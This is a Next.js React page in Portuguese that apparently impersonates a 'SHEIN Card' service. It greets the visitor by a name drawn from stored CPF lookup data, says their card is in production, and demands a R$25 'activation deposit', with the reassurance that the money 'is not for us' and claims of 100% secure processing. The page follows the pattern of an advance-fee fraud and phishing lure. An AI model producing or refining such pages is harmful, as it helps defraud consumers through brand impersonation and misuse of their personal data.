"use client"

import { useState, useEffect } from "react"
import Image from "next/image"
import { CheckCircle, CreditCard, Clock, Smartphone, Banknote, Headphones } from "lucide-react"

export default function ActivateAccountPage() {
  const [paymentAmount, setPaymentAmount] = useState("25.00")
  const [userName, setUserName] = useState("")

  useEffect(() => {
    // Carregar dados do pagamento e usuário
    const amount = localStorage.getItem("paymentAmount") || "25.00"
    const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")

    setPaymentAmount(amount)
    setUserName(cpfData.nome?.split(" ")[0] || "")
  }, [])

  const handleActivateAccount = () => {
    // Redirecionar para página de ativação ou processo de depósito
    window.location.href = "https://app.sheincard.com/activate" // URL fictícia
  }

  return (
    <main className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
      <div className="max-w-md mx-auto p-4">
        <div className="bg-white rounded-2xl shadow-xl p-6 text-center">
          {/* Header com Logo */}
          <div className="mb-6">
            <Image src="/shein-card-logo-new.png" alt="SHEIN Card" width={120} height={70} className="mx-auto mb-4" />
            <div className="flex items-center justify-center mb-2">
              <CheckCircle className="w-6 h-6 text-green-500 mr-2" />
              <span className="text-sm font-medium text-green-600">Pagamento Confirmado</span>
            </div>
          </div>

          {/* Título Principal */}
          <div className="mb-6">
            <h1 className="text-2xl font-bold text-green-600 mb-3">
              Parabéns{userName && `, ${userName}`}! Seu cartão está em produção!
            </h1>
            <h2 className="text-xl font-semibold text-gray-800 mb-4">Hora de ativar sua conta</h2>
            <p className="text-gray-600 text-sm leading-relaxed">
              Para ativar sua conta e usar seu cartão virtual, é necessário um depósito mínimo de{" "}
              <span className="font-bold text-black">R$25,00</span>.
            </p>
          </div>

          {/* Aviso Importante */}
          <div className="bg-orange-50 border-l-4 border-orange-400 rounded-lg p-4 mb-6 text-left">
            <p className="text-orange-800 text-sm">
              <span className="font-semibold">Este valor não é para nós</span>, ele ficará na sua conta e você poderá
              usá-lo como quiser assim que tiver acesso ao aplicativo.
            </p>
          </div>

          {/* Seção Conta Digital */}
          <div className="mb-8">
            <h3 className="text-lg font-bold text-orange-500 mb-4">Conta Digital SHEIN:</h3>

            <div className="space-y-3 text-left">
              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-yellow-400 rounded-full flex items-center justify-center">
                  <Clock className="w-4 h-4 text-white" />
                </div>
                <span className="text-gray-700 font-medium">PIX 24 horas</span>
              </div>

              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-yellow-400 rounded-full flex items-center justify-center">
                  <Banknote className="w-4 h-4 text-white" />
                </div>
                <span className="text-gray-700 font-medium">Pagamento de boletos</span>
              </div>

              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-yellow-400 rounded-full flex items-center justify-center">
                  <CreditCard className="w-4 h-4 text-white" />
                </div>
                <span className="text-gray-700 font-medium">Cartão Virtual</span>
              </div>

              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-yellow-400 rounded-full flex items-center justify-center">
                  <Smartphone className="w-4 h-4 text-white" />
                </div>
                <span className="text-gray-700 font-medium">Saques em caixas eletrônicos</span>
              </div>

              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-yellow-400 rounded-full flex items-center justify-center">
                  <Headphones className="w-4 h-4 text-white" />
                </div>
                <span className="text-gray-700 font-medium">Atendimento ao cliente 24/7</span>
              </div>
            </div>
          </div>

          {/* Ilustração e Valor */}
          <div className="mb-8">
            <p className="text-gray-700 font-medium mb-4">Ative sua conta depositando nela:</p>

            <div className="relative mb-6">
              <Image
                src="/hand-phone-illustration.png"
                alt="Ativação da conta"
                width={200}
                height={150}
                className="mx-auto"
              />
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="bg-white rounded-lg shadow-lg px-4 py-2 border-2 border-yellow-400">
                  <span className="text-2xl font-bold text-orange-500">R$25,00</span>
                </div>
              </div>
            </div>
          </div>

          {/* Botão de Ativação */}
          <button
            onClick={handleActivateAccount}
            className="w-full bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-black font-bold py-4 px-6 rounded-2xl transition-all duration-300 transform hover:scale-105 shadow-lg"
          >
            Ativar minha conta agora
          </button>

          {/* Informações Adicionais */}
          <div className="mt-6 text-xs text-gray-500 space-y-2">
            <p>✅ Processo 100% seguro e criptografado</p>
            <p>✅ Seu cartão físico chegará em até 7 dias úteis</p>
            <p>✅ Cartão virtual disponível imediatamente</p>
          </div>

          {/* Footer */}
          <div className="mt-8 pt-6 border-t border-gray-200">
            <p className="text-xs text-gray-400">SHEIN Card - Sua liberdade financeira começa aqui</p>
          </div>
        </div>
      </div>
    </main>
  )
}
